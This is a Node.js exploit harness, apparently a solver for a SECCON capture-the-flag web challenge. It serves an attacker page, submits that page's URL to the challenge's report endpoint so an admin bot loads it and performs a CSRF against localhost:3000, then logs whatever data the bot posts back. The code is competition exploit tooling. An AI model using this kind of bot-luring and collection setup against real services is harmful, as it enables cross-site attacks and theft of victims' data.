const fastify = require("fastify")();
const fs = require("node:fs").promises;

const fail = (message) => {
  console.error(message);
  return process.exit(1);
};

const SECCON_BASE_URL =
  process.env.SECCON_BASE_URL ?? fail("No SECCON_BASE_URL");
const ATTACK_BASE_URL =
  process.env.ATTACK_BASE_URL ?? fail("No ATTACK_BASE_URL");
const LISTEN_PORT = "8080";

if (!ATTACK_BASE_URL.startsWith("http://")) {
  fail("Invalid ATTACK_BASE_URL: the CSRF will fail");
}

const sleep = (msec) => new Promise((resolve) => setTimeout(resolve, msec));

const reportUrl = async (url) => {
  const res = await fetch(`${SECCON_BASE_URL}/report`, {
    method: "POST",
    headers: {
      "Content-Type": "application/json",
    },
    body: JSON.stringify({
      url,
    }),
  }).then((r) => r.text());
  console.log(res); // "Received :)"
};

const start = async () => {
  fastify.get("/", async (req, reply) => {
    const html = await fs.readFile("index.html");
    return reply.type("text/html; charset=utf-8").send(html);
  });

  fastify.post("/", async (req, reply) => {
    console.log(req.body);
    process.exit(0);
  });

  fastify.listen(
    { port: LISTEN_PORT, host: "0.0.0.0" },
    async (err, address) => {
      if (err) fail(err.toString());

      await sleep(3 * 1000);
      await reportUrl(
        `${ATTACK_BASE_URL}?${new URLSearchParams({
          baseUrl: "http://localhost:3000",
        })}`
      );

      await sleep(20 * 1000);
      fail("Failed");
    }
  );
};
start();
